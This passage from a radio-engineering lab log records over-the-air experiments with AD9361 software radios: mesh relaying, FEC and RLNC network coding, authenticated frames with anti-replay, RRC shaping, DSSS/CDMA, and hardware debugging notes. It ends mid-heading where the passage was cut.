- **Restrict the preamble search to positions where the WHOLE frame fits**, else the
  correlator locks onto a late partial frame (corr 0.998 but truncated payload). Guard:
  `need = 63*OSF + (npay-1)*OSF + OSF/2 + 1; for s in 0..=(m-need)`.
- **Throughput scales with payload** because the 63-symbol PN preamble is amortised:
  8-byte frame ~48 kbps, 23-byte frame ~576 kbps (symbol rate 30.72 MHz/OSF40 =
  768 ksym/s). Honest caveat: a 9920-sample frame in a 16384-sample capture leaves little
  start margin -- 2 of 3 captures missed the full frame. Streaming RX + multi-frame
  reassembly is the real throughput next step.
- **BER-vs-TX-power is a real link-quality curve** (8-byte frame, on-node demod, sweeping
  .13 TX gain): 0/64 errors at -10/-20/-30 dB, then a CLIFF -- 34/64 at -40, 36/64 at -50
  (corr_peak collapses 1.0 -> 0.1). This IS the physical basis of the SNR-weighted DePIN
  reward: above threshold a node delivers clean bytes and earns; below it delivers
  nothing. The receipt the radio feeds is the SAME one the full chain (signature,
  settlement, Merkle, ledger, slashing, SHA-256 claim) already consumes.
- Boundary: the DSP demod is scratchpad Rust in relay_meter (not the repo t27 critical
  path); the receipt it feeds IS t27. Burst mode (one frame/capture) forced by the RX
  overrun bound.

**MULTI-FRAME throughput + FEC-over-air + averaging gain (2026-07-18o,
smoke/DEPIN_RADIO_ABC_2026-07-18.md).** Added an on-node TX generator to relay_meter
(`otatx`/`otatxfec`, bit-compatible with dbpsk.py) so TX and RX are the same binary, plus
three RX modes. All three closed on iron (.13->.12, no flash).
- **A `otarxmulti`:** lock the preamble ONCE, then STEP by the known frame length -- up to
  9 back-to-back frames from one capture (72 bytes, ONE aggregated receipt, BER=0),
  ~384 kbps sustained vs the old ~48 kbps burst. RX overrun ceiling is ~64K samples (4x the
  old 16384), so bigger captures = more frames; ~1/3 captures still miss on acquisition.
- **B `otarxfec`:** TX 5 frames whose XOR == 0 (4 data + 1 parity via t27 `fec_parity4`).
  ANY erased frame == XOR of the other four, so recovery works regardless of the cyclic
  capture rotation; rebuilt bit-exact via `fec_parity4` over survivors, verified over air.
- **C `otarxavg`:** fold M cyclic copies, average the differential statistic. At -45 dB TX
  single-copy BER hit 14/64; 8-9x averaging -> BER=0 (reproduced). At -50 dB averaging
  can't help -- the PREAMBLE LOCK fails first, which is exactly where the DSSS PL gain
  (flash-gated) is needed. Software preview of processing gain.

**HARDWARE-RADIO GOTCHAS THAT COST TIME THIS WAVE (all broken-ruler-class):**
- **`timeout` DOES NOT EXIST in macOS zsh.** A prior wave's "ssh daemon down" verdict was
  self-inflicted: the ssh wrapper died on missing `timeout`, not the boards. Never diagnose
  reachability through a wrapper that itself fails. Rely on ssh's own `-o ConnectTimeout`.
- **The AD9361 TX LO powers DOWN (TXpd->1) when the cyclic writer is (re)started or killed.**
  A powered-down carrier makes RX see only noise (corr ~0.13, garbage bytes) -- the RX signal
  lies about a "link failure" that is really a dead transmitter. FIX: force
  `echo 0 > out_altvoltage1_TX_LO_powerdown` AFTER the writer is up, right before RX.
- **`ps -A | grep -c iio_writedev` OVER-COUNTS**: the remote command's own text contains the
  string, so grep matches the ssh process running it. Count real writers via
  `/proc/PID/comm == iio_writedev`. Multiple writers on the one DMA channel corrupt TX; get
  to exactly one before measuring (identity-before-shared-medium).
- **Greedy global-argmax multi-frame search jumps a full pattern-period under noise** (locks
  the same frame every period instead of the neighbour). Acquire once, then step -- modem
  framing. On the host (noiseless) the greedy bug is invisible; it only bites over the air.
- Detached cyclic writer: `setsid sh -c '... < file >log 2>&1' </dev/null >/dev/null 2>&1 &`
  in its OWN ssh call (backgrounding inside a captured ssh swallows the step's stdout).

**STREAMING RX + 4-NODE PROOF-OF-COVERAGE (2026-07-18p,
smoke/DEPIN_STREAMING_4NODE_2026-07-18.md).** A 4th P201Mini joined at .10.
- **The RX overrun was ENTIRELY the demod-in-the-pipe, not the DMA.** `iio_readdev -s N -b N
  ... > /tmp/cap.iq` (tmpfs = RAM speed) then demod the FILE offline has ZERO overrun at
  `-s 4194304` (128x the old ~32K ceiling). Decouple capture from compute -- that is the
  streaming fix. 4 MB (~34 ms) -> 203 frames ~99% clean; 16 MB (~136 ms) -> 815 frames 92%
  clean, one running receipt. ~384 kbps sustained. Batch demod (~3 s/16 MB on ARM), not
  real-time -- the CAPTURE is gapless, which is what the air link needs.
- **A fixed frame grid (`start0 + k*flen`) WALKS OFF over long streams**: the two boards'
  30.72 MHz clocks differ ~10 ppm, so ~160 samples (>3 frames) of drift over 16 M samples
  breaks a fixed grid (0/819 clean). FIX: track from the ACTUAL locked position
  (`expected = start + flen`) + a WIDE re-acquire when corr dips (self-heal). Then lock holds
  across 800+ frames. On the host (no drift) the fixed grid looks fine -- drift only bites OTA.
- **Multi-witness Proof-of-Coverage** (`otarxset`): recover frames, dedup+sort payloads, seal
  over the CANONICAL sorted set so the seal is capture-phase-INDEPENDENT. .13 broadcast, and
  .10/.11/.12 each independently produced the IDENTICAL seal 0xCDB1F3B1 -- three nodes
  cryptographically attest the same coverage (Helium-class PoC, real radio). This is how the
  network rewards multi-confirmed coverage instead of a single self-report.
- The new host at .10 identifies as a P201Mini (`hostname pzp201mini`), NOT a bigger FPGA --
  if a large FPGA is intended (e.g. to host the DSSS PL without the P201Mini cold-cycle risk)
  it is not on the subnet yet.

**2-HOP RADIO RELAY -- byte-exact "internet from the air" (2026-07-18q,
smoke/DEPIN_2HOP_RELAY_2026-07-18.md).** Bytes crossed .13 ->(air)-> .12 ->(air)-> .10 over
TWO radio hops, no Ethernet, byte-exact.
- **`otarelay`**: a node relays entirely on-chip -- demod capture -> recover set -> print hop
  receipt (STDERR) -> re-emit regenerated DBPSK IQ (STDOUT) piped into iio_writedev. The
  coverage seal was IDENTICAL at origin, hop-1 (.12) and hop-2 (.10): 0x9DBE2510 (reproduced
  x3) -- cryptographic proof the payload survived two hops untampered, trusting no relay.
- Sequenced store-and-forward on ONE 2.4 GHz channel: .13 TX, .12 captures+relays, then .13
  TX OFF and .12 re-transmits, .10 RX. Concurrent hops need frequency-division or a TDD
  schedule.
- **MAJORITY FILTER (real bug found):** dedup-BY-VALUE turns any single bit-errored frame into
  a phantom "distinct" payload that changes the coverage seal (got distinct=5, seal mismatch).
  A one-off bit error decodes to a unique wrong value seen ONCE; every real cyclic payload is
  seen many times. `ota_recover_set` now counts occurrences and keeps only payloads seen >= 2
  times -- backs both `otarxset` and `otarelay`. This is what makes the hop robust.

**ORDERED MESSAGE across 2 hops (2026-07-18r, smoke/DEPIN_MSG_RELAY_2026-07-18.md).** The relay
now carries an ARBITRARY ORDERED message, not a deduped set.
- **Ordered framing**: each 8-byte payload = `seq:u16 LE ++ 6-byte chunk`. `otatxmsg` splits a
  message into ceil(len/6) numbered frames; `ota_recover_msg` majority-votes the data PER seq
  slot (a bit error in one copy of chunk k can't corrupt it -- the right chunk k is seen many
  times) and reassembles in seq order; `otarxmsg`/`otarelaymsg` are the RX/relay modes.
- A readable sentence "TRINET mesh hop .13>.12>.10 OK!" (31 B, 6 chunks) crossed
  .13->(air)->.12->(air)->.10 byte-exact, message-seal 0x37A9A9F6 IDENTICAL at origin/hop-1/hop-2
  (x3). Real arbitrary-data multi-hop, not just coverage attestation.
- Boundary: fixed test string in a cyclic buffer (a live changing source is the next step); RX
  is told the message length (a length header in seq=0 is a small follow-on).

**CONCURRENT FDD 2-HOP PIPELINE (2026-07-18s, smoke/DEPIN_FDD_PIPELINE_2026-07-18.md).** The
relay now runs CONCURRENTLY with the source on a different frequency (pipelined, not baton-passed).
- **The AD9361 RX_LO and TX_LO are INDEPENDENT PLLs in `fdd` ensm_mode** (`cat ensm_mode` ==
  fdd; also `pinctrl_fdd_indep` available). One chip does RX @ 2.40 GHz AND TX @ 2.45 GHz at the
  SAME time. Sysfs: `out_altvoltage0_RX_LO_frequency` (RX), `out_altvoltage1_TX_LO_frequency`
  (TX) -- both under the ad9361-phy device, both "out_altvoltage".
- **ISOLATION proven:** .12 recovered the full message on 2.40 (5/5) WHILE its own 2.45 TX ran --
  a board's own TX does not blind its RX with 50 MHz of separation. **HOP-2 LIVE:** .10 (RX 2.45)
  recovered the relay WHILE .13 still TX'd on 2.40. Both hops concurrent, seal 0xE0AA4F5D
  identical origin/hop-1/hop-2.
- **GOTCHA:** an early "RX pulled to 2.45" scare -- setting one LO appeared to drag the other.
  It did NOT persist; re-setting RX_LO=2.40 right before the capture held. Always read the LO
  back immediately before RX; the retune settles.
- **Marginal SNR needs more votes:** .13->.12 at 5 message-periods gave 3/5 chunks; 20 periods
  (`-s 524288`) gave 5/5. The per-slot majority vote fills in as copies accumulate -- capture
  bigger when a chunk is missing rather than assuming a link fault.
- FDD pipelining removes the baton-passing 1/N throughput loss: each hop on its own frequency
  transmits continuously. The one-$100-chip full relay (listen one band, forward another,
  concurrently) is the key enabler.

**FDD channel-spacing sweep + live source (2026-07-18t,
smoke/DEPIN_FDD_SWEEP_LIVE_2026-07-18.md).** ("все три" -- 1 & 2 done, 3 still blocked.)
- **Min separation ~20 MHz on one chip**: .12 RX@2.40 while TX@(2.40+delta) an interferer, sweep
  delta -- clean (5/5, hears .13) at delta>=20 MHz, desensed (4/5, wrong seal) at delta<=15 MHz.
  RX rf_bandwidth=18 MHz (half=9 MHz) + roll-off explains it.
- **The desense is ANALOG, not digital**: narrowing `in_voltage_rf_bandwidth` to 4 MHz did NOT
  help at delta=5 MHz -- .12 decoded its OWN interferer (own TX saturates the shared RX front-end
  before the digital filter). Tighter packing needs an external duplexer / separate antennas, not
  a narrower digital filter. Set the channel plan from this, not from the digital BW.
- **Live changing source works**: .13 cycled TICK=01/02/03, each relayed .13->.12->.10 over the
  FDD pipeline and recovered intact at .10. The mesh carries live content, not a static string.
- **DSSS-on-big-FPGA still blocked**: re-scan found no big FPGA on net/USB; needs Vivado+ADI-HDL
  or a bigger board. Gate satisfied, artifact/tooling absent (unchanged).

**CONTINUOUS EVOLVING STREAM + the raw-FER finding (2026-07-18u,
smoke/DEPIN_LIVE_STREAM_2026-07-18.md).** A real telemetry/file stream, not a repeating buffer.
- `otatxstream <nframes> [start]` / `otarxstream <key> <epoch> <nframes>`: each frame payload =
  `seq:u16 ++ 6-byte ASCII "{:06}" of seq` (self-verifying). .13 generated 4000 UNIQUE frames
  (82 MB, ~15 s on ARM) and streamed once via `iio_writedev -b 51200` with NO `-c` (non-cyclic,
  ~667 ms, never repeats). .12 caught a live run DEEP in the stream (seq 1560..1659) and
  reassembled by seq, verifying each value == its seq. Best 99/100.
- **iio_writedev is non-cyclic WITHOUT `-c`**; with a big file + modest `-b` it loops reading
  stdin and streams the whole file continuously (a giant single `-b` fails the DMA alloc).
- **STREAMING EXPOSES THE RAW LINK FER.** Cyclic buffers let the RX majority-vote over repeats,
  hiding per-frame errors; a single-pass stream has no repeats, so the raw frame-error rate
  shows through -- 1% on a good capture, up to ~40% on a bad one (SNR varies). Not a regression:
  the true link quality majority-voting was masking. A real stream needs per-frame FEC
  (`tri_fec` interleaved) or a repeat factor -- the robustness next step.
- The capture always landed ~seq 1500 because the ssh-to-capture latency is ~constant (~250 ms
  into a 667 ms stream); not a bug.

**INTERLEAVED STREAMING FEC over the air (2026-07-18v,
smoke/DEPIN_STREAM_FEC_2026-07-18.md).** Heals the raw-FER drops: rate-4/5, t27 fec_parity4.
- `otatxstreamfec <ndata>` / `otarxstreamfec <key> <epoch> <nframes>`. Data value = f(seq) =
  seq*2654435761 (non-trivial parity + verifiable recovery). Every 4 data frames -> 1 parity =
  `fec_parity4` of the four values; a block that loses ONE data frame is rebuilt from parity + 3
  survivors. Parity frames marked by seq >= 0xC000.
- **Interleaved in super-blocks of 20** (column-major TX) so a burst <=20 hits <=1 frame/block
  AND each block's data+parity land in one RX capture. Over the air: healed **40 dropped frames
  in one capture (358/400 -> 398/400, ~90% -> 99.5%)**; remaining drops are blocks with >=2
  losses (single-parity limit). 20% overhead.
- **Metric gotcha:** a windowed capture must contain a FULL period or the interleave makes
  out-of-window frames look like drops. Fix: stream a repeated period and capture ~1 period
  (seq_run must be the full [0..ndata-1]); DON'T capture >=2 periods or the duplicate copies mask
  the drops (the good copy wins) and hide the FEC benefit.

**DOUBLE-PARITY / GF(256) FEC -- recover 2 losses per block (2026-07-18w,
smoke/DEPIN_STREAM_FEC2_2026-07-18.md).** `otatxstreamfec2` / `otarxstreamfec2`, rate 4/6.
- Each block of 4 data gets TWO parities: p0 = XOR (`fec_parity4`, seq 0xC000+g); p1 =
  sum alpha^i * d_i over GF(256), alpha=2 -> coeffs [1,2,4,8] (seq 0xD000+g). Two lost data frames
  (positions a,b) recover per byte by solving `[1 1; alpha^a alpha^b][d_a;d_b]=[y0;y1]` with the
  t27 rlnc_decode `solve_2x2`/`gf_mul`/`gf_inv` (GF(256), reduction poly 0x1B). Embedded those
  three inline like fec_parity4.
- Host-verified: dropping 2 frames of the SAME block healed both, seal matched clean bit-exact.
- Over the air: heal2 fired 1-4 blocks/capture; best captures 384/384 drops_left=0 (two-loss
  blocks that single parity could NOT fix last wave). 33% overhead (rate 4/6). Remaining drops =
  blocks with >=3 losses or a lost parity frame.
- Entry point to full RLNC (`rlnc_coding.t27`): more independent parities -> survive more losses.

**FULL RLNC + ADAPTIVE REDUNDANCY over the air (2026-07-18x,
smoke/DEPIN_RLNC_ADAPTIVE_2026-07-18.md).** ("все три": 1&2 done, 3 blocked.)
- `otatxrlnc <ngen> <R>` / `otarxrlnc <key> <epoch> <nframes> <R>`. Generation K=8: 8 systematic
  data + R coded (random GF(256) combos, t27 rlnc_coding `coding_vector`/`coeff_at`). The RX
  builds the coding matrix per generation (data->unit rows, coded->their vectors) and Gaussian-
  eliminates over GF(256) (`rlnc_solve`, using t27 gf_mul/gf_inv); any 8 independent rows recover
  all 8 -- ANY R losses in ANY positions (data OR coded).
- Host-verified: dropping 3 data frames of a gen recovered all 8, seal matched clean bit-exact.
- Over the air (K=8, R=5, 48 gens): **15 lossy generations fully recovered -> 384/384 = 100%
  delivery, failed=0** (reproduced ~14/capture). Losses in arbitrary positions -- beyond fixed
  single/double parity. Decode ~9 s on the ARM (offline batch; real-time needs PL/lower rate).
- **ADAPTIVE R:** the RX measures frame-delivery p (~92-94%) and computes R_rec =
  ceil(K(1-p)/p)+1 = 2; ran R=5, can drop to R=2 (overhead 38%->20%). Closed loop: measure the
  channel, size the code. (window-edge generation with <8 frames -> 1 honest failed.)
- DSSS-on-big-FPGA still blocked (no big FPGA on net/USB).

**RLNC RECODE AT THE RELAY -- message across 2 hops without the relay decoding (2026-07-18y,
smoke/DEPIN_RLNC_RECODE_2026-07-18.md).** The canonical network-coding win, over real radio.
- Frames carry their coding vector EXPLICITLY: K=4, payload 10 B = `g:u16 | cv[4] | value:u32`.
  Source `otatxrlnc2 <hex_msg> <R>` (4 data unit-vectors + R coded); relay `otarecode <nframes>
  <M>` mixes received coded frames into M fresh random GF(256) combinations WITHOUT decoding
  (new_cv=sum beta_k cv_k, new_value=sum beta_k value_k); dest `otarxrlnc2 <key> <e> <nf> <msg_len>`
  Gaussian-solves (rlnc_solve4) any >=4 independent-cv frames -> the message.
- Over the air .13->.12->.10: readable "TRINET RLNC RECODE .13>.12>.10 OVER AIR OK!" decoded 3/3
  at .10 from the RELAY'S recoded frames -- .12 never saw the plaintext. Multipath/multicast gain
  + a privacy property (the relay can't read the traffic).
- **HARD-WON DEBUG:** OTA read pure noise -- NOT RF. Causes: (a) a non-cyclic source stream that
  finished before the ssh-sequenced capture (the stream must outlast ssh latency, or loop), and
  (b) a MISSING input file (`/tmp/t.iq`) made iio_writedev exit instantly (writers=0). Fix: a
  transceiver reset (`echo sleep > ensm_mode; echo fdd > ensm_mode`) cleared a stale DDS state,
  and a CYCLIC source (`-b 138240` = one full period) kept the signal continuously on air. ALWAYS
  confirm the writer stays alive (writers=1) AND the input file exists before blaming RF; a
  known-good otatx/otarx (corr=1.000) isolates RF from framing.

**MULTI-SOURCE RLNC -- two senders decode what neither can alone (2026-07-18z,
smoke/DEPIN_RLNC_MULTISRC_2026-07-18.md).** The multipath gain of network coding.
- `otatxcoded <hex_msg> <src_id> <ncoded>`: one source's PURE coded frames, coding vectors
  MDS/Vandermonde `[1, x, x^2, x^3]` with x UNIQUE per frame across sources (x = src*16+j+1) --
  any 4 distinct-x frames are independent (guaranteed, unlike the LCG `random_coeff` which was
  RANK-DEFICIENT for some generations -- don't use it for coding vectors). `otarxrlnc2` takes a
  2nd capture file and MERGES frame lists (demod each SEPARATELY -- IQ-concat creates
  boundary-garbage that mis-tracks the whole 2nd file).
- Over the air .13+.11->.10 (3 coded/source): .11 alone 0/3, .13 alone 1/3 (message unreadable),
  BOTH 3/3 -> exact "MULTI-SOURCE RLNC OVER AIR .11+.13". Coded frames are fungible: the RX doesn't
  care which sender a frame came from.
- **Decoder robustness (each was needed for OTA):** (1) dedup rows by cv + majority-vote the value
  (a cyclic capture gives many copies; clean beats bit-errored); (2) RANSAC solve -- try 4-subsets,
  keep the solution the MOST frames agree with; (3) accept only if **>=5 agree** (the solving
  4-subset trivially agrees with itself, so a genuine over-determined solution needs >=1 MORE frame
  -- this is what rejects an under-determined single source). A per-frame CRC would make single
  source a clean 0/3 (the residual .13 1/3 is a garbage frame giving a false 5th agreement).

**PER-FRAME CRC hardens the coded stack (2026-07-18aa,
smoke/DEPIN_RLNC_CRC_2026-07-18.md).** Added the t27 crc16 (CCITT, poly 0x1021, init 0xFFFF) to
every K=4 coded frame: payload 12 B = `g:u16 | cv[4] | value:u32 | crc16:u16` over the first 10 B.
`ota_read_frames4` DROPS any CRC-failing frame (returns the drop count) -- a corrupt coded frame
is a wrong linear equation and must never reach the GF(256) solver.
- **This let the decoder DELETE its RANSAC/>=5-threshold crutches** -- with CRC-clean frames it's
  a plain rank-4 solve on the distinct coding vectors (`rlnc_solve4` on cv-deduped rows).
- Over the air .13+.11->.10: single sources now fail CLEANLY 0/3 (crc_dropped=1 each) -- last
  wave's residual .13 1/3 false-accept is GONE -- and BOTH still decode 3/3 (crc_dropped=2) ->
  exact "MULTI-SOURCE RLNC OVER AIR .11+.13". Same result, now correct-by-construction not by a
  majority heuristic. crc_dropped>0 every capture confirms the CRC rejects real OTA-corrupt frames.
- Frame length grew to ota_frame_len(12)=6400 complex; cyclic TX `-b 57600` (9 frames) worked.
- Boundary: CRC-16 has ~1/65536 undetected-error rate; +2 B/frame overhead. A safety-critical
  link wants a wider CRC or an authenticated MAC.

**AUTHENTICATED FRAME (keyed MAC) + concurrent FDD sources (2026-07-18ab,
smoke/DEPIN_AUTH_FDD_2026-07-18.md).** ("все три": 1&2 done, 3 blocked.)
- **Keyed MAC = first word of SHA-256(key || frame10) via the embedded t27 tri_sha256.** Frame is
  now 14 B: `g:u16 | cv[4] | value:u32 | mac32:u32`. `ota_pl4(key,...)` signs, `ota_read_frames4
  (key,...)` DROPS any frame whose MAC fails. **Do NOT use the repo `hmac_md5` -- it's a stub XOR
  (key^msg), trivially forgeable.** For a fixed-length frame, SHA-256(key||frame) truncated is a
  secure MAC against forgery.
- Over the air: a forger node (wrong key) had EVERY frame rejected (mac_dropped=73 copies, 0/3) --
  a node without the key cannot inject into the coded mesh; genuine sources (key K) decode 3/3.
  Authenticity, not just integrity -- the SSI / IEC-61499 / ASU-TP control-command story.
- **The MAC has no nonce -> no replay protection** by itself (a captured valid frame can be
  re-sent). Production adds a nonce/sequence (full HMAC-SHA256 / Poly1305). Coding vectors being
  unique per frame limits useful replays.
- **Concurrent FDD sources:** .13 @ 2.40 GHz and .11 @ 2.45 GHz transmit AT THE SAME TIME; .10
  tunes its RX to each band in turn (both on air throughout) and decodes 3/3. Frequency-division
  multi-access -- multiple simultaneous senders. (One RX can't grab two 5 MHz-separated bands in a
  single capture; wide-band or 2-RX is the next step.)
- Frame length ota_frame_len(14)=7040 complex; cyclic TX `-b 63360` (9 frames).
- DSSS-on-big-FPGA still blocked (no big FPGA on net/USB).

**ANTI-REPLAY (epoch under MAC) + WIDE-BAND single-radio dual-source (2026-07-18cd,
smoke/DEPIN_ANTIREPLAY_WIDEBAND_2026-07-18.md).** ("все три": 1&2 done OTA, 3 DSSS blocked.)
- **Epoch under the MAC kills replay.** Frame is now 16 B: `g:u16 | cv[4] | value:u32 |
  epoch:u16 | mac32:u32`; mac32 = first word of SHA-256(key || first 12 B) so the epoch is
  AUTHENTICATED (forger cannot edit it). `ota_read_frames4(key, min_epoch, ...)` drops any frame
  with `epoch < min_epoch` and returns a `replay` count. Fresh (epoch>=window) decodes; a captured
  authentic old frame is stale-dropped.
- **Un-foolable OTA proof = decode ONE capture two ways.** .13 sends epoch=5, captured once;
  `min_epoch=0` -> 1/1 (proves frames good+authentic), `min_epoch=10` -> 0/1 `replay_dropped=24`
  (same bits, freshness window is what rejects). Avoids the broken-ruler trap of "0/1 might just be
  no lock".
- **Wide-band channelizer = digital mix + boxcar LPF.** `ota_mix` multiplies by e^{-j2pi(f/fs)n}
  to slew a band to baseband; `ota_boxcar(.,.,16)` nulls the adjacent band at +/-3.84 MHz (passband
  droop ~2.4 dB). `otarxrlnc2 ... <min_epoch> <mix1> <mix2>` demods the SAME capture at two offsets
  and merges. .13@2.400 + .11@2.404 transmit AT ONCE, .10 ONE capture @2.402, mix +/-2 MHz -> 1/1;
  band A alone (mix2=0) -> 0/1 (2 of 4 coded frames). One antenna, two concurrent senders.
- **HARDWARE GOTCHAS THAT COST THE WAVE (broken-ruler, all silent):**
  - **busybox has NO `pkill`** (returns 127, swallowed by `2>/dev/null`). Every "stop TX" was a
    no-op -> stuck `iio_writedev` orphans held the DDS/DMA -> after the first clean run NO board
    radiated, yet the decoder honestly reported 0/1. **Use `killall`**; verify writers=0 via
    `/proc/*/comm`.
  - **AGC (`slow_attack`) confounds the IQ-power probe** -- RMS FALLS when a strong TX appears
    (AGC cuts gain). Use **manual RX gain** (`in_voltage0_gain_control_mode=manual`,
    `in_voltage0_hardwaregain=40..60`) so power is a truthful independent instrument and demod is
    deterministic.
  - **A `nohup`-detached writer streams unreliably.** Run the writer in a **live foreground ssh**
    backgrounded from the host; guarantees streaming during the capture. And a `P=$(launch_tx)`
    command-substitution HANGS if the backgrounded ssh keeps the substitution's stdout pipe open --
    add a LOCAL `>/dev/null 2>&1 &` on the ssh.
- Frame length ota_frame_len(16)=7680 complex; cyclic TX `-b 46080` (6 frames) / `-b 15360` (2).

**SLIDING WINDOW + 3-SOURCE CHANNELIZER + PROCESSING-GAIN (2026-07-19,
smoke/DEPIN_WINDOW_CHANNELIZER_2026-07-19.md).** ("все три": all 3 host bit-exact; OTA deferred.)
- **RFC 6479 sliding replay window** replaces the monotone `min_epoch`. State `(high, bitmap64)`;
  bit i = "seq high-i seen". Accept if it advances the window OR is in-window with a clear bit
  (reorder-tolerant); drop if bit set (replay) or older than window. `otarxwin <key> <win_high>
  <win_bitmap_hex> <nframes> <msg_len>` prints accepted/dup/old and the EVOLVED WINSTATE so a 2nd
  run chains it. otatxcoded's epoch field is now a per-frame incrementing SEQ. Host: fresh->6 accept
  1/1; reorder (seed high=105 bm=0)->6 accept; replay (seed high=105 bm=0x3F)->0 accept dup=6. Same
  high, different bitmap => window distinguishes "seen" from "merely old" (a counter can't).
- **Complex band-pass channelizer** (`ota_fir_bp`: heterodyne subcarrier->DC, Kaiser LPF,
  heterodyne back) rejects the NEGATIVE-freq image of a lower neighbour (the DBPSK subcarrier is
  one-sided at +768 kHz, so a lower band mirrors onto -732 kHz -- a symmetric LPF/boxcar can't
  separate it). `otarxwide <key> <min_epoch> <nframes> <msg_len> <cutoff_hz> <ntaps> <mix...>`;
  ntaps=0 -> boxcar. 3 sources @2 MHz spacing (ncoded=4) -> 1/1 host; 1 band -> 0/1.
- **HONEST WAVEFORM LIMIT:** DBPSK main lobe is +-768 kHz (symbol rate = subcarrier) -> channels
  closer than ~2 MHz physically overlap; denser needs TX RRC pulse shaping (next-Wave). At robust
  ncoded the RLNC redundancy masks boxcar-vs-bandpass, so don't over-claim the filter's edge.
- **Coherent processing-gain preview** (`otafoldc`): average M cyclic copies of the RAW IQ BEFORE
  the differential detector (signal by amplitude, noise by power) -> ~10*log10(M). Host, sigma=5000
  (~-7 dB SNR): M=1 BER=33/64 -> M=32 BER=1/64. Averaging `db` (post-differential, as otarxavg
  does) does NOT give clean gain -- must average raw IQ. Host harness only.
- **OTA LINK DEGRADED mid-session** -- the SAME rig that decoded 1/1 hours earlier (and carried the
  prior wave) read rms ~20 (noise) with TX at 0 dB / full power; the prior wave's own script also
  gave 0/1. Physical drift (antenna/thermal/bench), NOT code: decoder honestly said no-signal, the
  IQ-power probe confirmed. Deferred OTA re-run rather than report a number on a noise-floor link.
- **zsh gotcha (again):** unquoted `$VAR` is NOT word-split in zsh -- `otatx $Ps` passed one giant
  arg -> hex panic. Use `${=Ps}` (or explicit args).

**RRC SHAPING + LINK GUARD + TRUE DSSS (2026-07-19,
smoke/DEPIN_RRC_LINKGUARD_DSSS_2026-07-19.md).** ("все три": all host bit-exact; guard demo'd on HW.)
- **`linkq <floor>` = honest link guard.** Finds best DBPSK-preamble correlation, reports
  normalized `cp` (1.0=lock, ~0=none), exits non-zero if cp<floor. **rms lies, correlation doesn't:**
  host noise cp=0.08 at rms=25772 (HIGHER than clean rms=2199 cp=1.0) -> LINK DEGRADED. Run it
  BEFORE a decode so a dead link is reported as such, not as 0/1 (the broken-ruler lesson as a tool).
- **RRC pulse shaping** (`ota_gen_bits_rrc`, `ota_rrc_taps`, `rrc`): replaces rectangular NRZ; ACLR
  (`aclr <spacing> [beta] [span]`) measured rect vs RRC beta=0.25: @1.5MHz -15.1 vs -29.9 dB, @2MHz
  -18.1 vs **-51.5 dB** (33 dB cleaner). The transmit-side fix for dense channels (sinc skirt ~1/f
  vs RRC's fast rolloff). Main lobe (1+beta)*Rs/2.
- **True DSSS** (`dsstx <hex> <N>` / `dssrx <hex> <N>`): spreads a UNIQUE payload by an N-chip PN
  (bit=1 inverts code), despreads by integrate-and-dump on the SOFT differential (`ota_db_soft`,
  `ota_find_soft`) then correlates N chips vs code. gain ~10log10(N). Host sigma=4000: N=1 BER 5/32
  (broken) -> N=7 BER 0/32 "deadbeef"; sigma=6000 needs N=31. **Key: SOFT differential -- the hard
  ota_db saturates each sample to +-1 and caps gain; ota_db_soft keeps magnitude.** Distinct from
  last wave's averaging-of-repeats preview.
- **OTA link STILL degraded** (guard-confirmed on HW: cp 0.075-0.154 at TX -5 dB across gains).
  Physical (antenna/thermal/bench), not code -- persists across waves. OTA re-run pending a stable
  bench; features are host bit-exact + ARM-deployed.

**RRC MATCHED FILTER + DSSS/CDMA + SELF-DIAGNOSING BENCH (2026-07-19,
smoke/DEPIN_RRCMF_CDMA_SELFDIAG_2026-07-19.md).** ("все три"; bench RECOVERED the link on HW.)
- **Self-diagnosing bench (ota_linksweep.sh) RECOVERED the "dead" link.** Swept TX+RX LO x RX gain,
  scored by `linkq` cp. The degradation was WEAK SIGNAL, not a dead antenna: fixed gain 60 (prior
  waves) sat below lock; **RX gain 71 at 2.400/2.460 GHz -> cp 0.52-0.65 LINK OK**. Marginal+fading
  though (cp bounces 0.17-0.65), below the 0.9 per-frame threshold -> plain OTA decode still
  unreliable, DSSS shows a gain TREND under fade but not clean. **Max TX power (0 dB) made it WORSE
  (PA distortion)** -- -5 dB better. Auto-gain/freq recovery is the deliverable.
- **Full RRC modem = TX shaping + RX MATCHED FILTER.** `rrcber`: mix subcarrier->DC, RRC matched
  filter (`ota_conv_real` + `ota_rrc_taps`), **sample at symbol CENTRES then differential-detect
  symbol-to-symbol** (a per-sample ota_db is WRONG for a shaped pulse -- it varies within a symbol).
  Clean: t0=309 sync=63/63 BER=0/32 "deadbeef" (zero-ISI: root-RC x root-RC = RC). GOTCHA: emit the
  FULL filtered length from ota_gen_bits_rrc (incl. RRC tail) or the RX timing search collapses to
  t0=0 (group delay pushes symbols past a truncated end).
- **DSSS + code division (`cdma <N> <hexA> <hexB> [sigma]`).** Two senders, DIFFERENT PN codes
  (`dsss_code_seed(n, seed)`), SAME band, SAME time; RX despreads each by its code (soft
  integrate-and-dump), the other code averages to noise. Both BER=0/32 clean AND at sigma=3000
  (N=31). Complement of the FDD channelizer: many hidden senders in ONE band.

**SELECTION COMBINING + RLNC-over-CDMA + CLOSED-LOOP ADAPT (2026-07-19,
smoke/DEPIN_SELCOMB_CDMARLNC_ADAPT_2026-07-19.md).** ("все три"; adaptation loop runs on HW.)
- **Selection combining (`otarxbest <hex> <nbytes>`)** for a fading link: find the frame phase, score
  EVERY cyclic copy by preamble correlation (`ota_corr_at`), decode the BEST copy (the one in a good
  fade). Host 20 copies -> best_cp=1.000 BER=0/32. Beats first-lock-then-step on an intermittent link.
- **Closed-loop link adaptation (linkadapt.sh) ON HARDWARE:** auto-selects RX gain by `linkq` cp
  (swept 40/55/64/71 -> chose 71), then logs cp TELEMETRY once/sec: cp swung 0.114-0.560 over 8 s,
  crossing LINK OK at t5. The fading is MEASURED, not asserted -- and catchable. No human in the loop.
- **RLNC coded frames over CDMA (`cdmarlnc <N> [sigma]`):** each source spreads its MAC'd K=4 coded
  frames with a DIFFERENT PN code, same band/time; RX despreads by code, MAC-verifies, GF(256)-solves.
  codeA alone 2 frames -> 0/1; A+B 4 frames -> 1/1 "TRINET-WIDEBAND!" clean AND at sigma=2000/4000.
  DSSS range x CDMA multi-access x RLNC multipath in one primitive.
- **OTA link is fading + non-stationary** (telemetry cp 0.11-0.56; the sweep's 0.647 was a lucky
  good fade). Selection combining is the right tool but a clean OTA byte needs a good fade DURING the
  capture. Don't keep hammering OTA -- the link is the variable; the telemetry now shows how it varies.

**EVENT-TRIGGERED OTA + MESH BUDGET (2026-07-19,
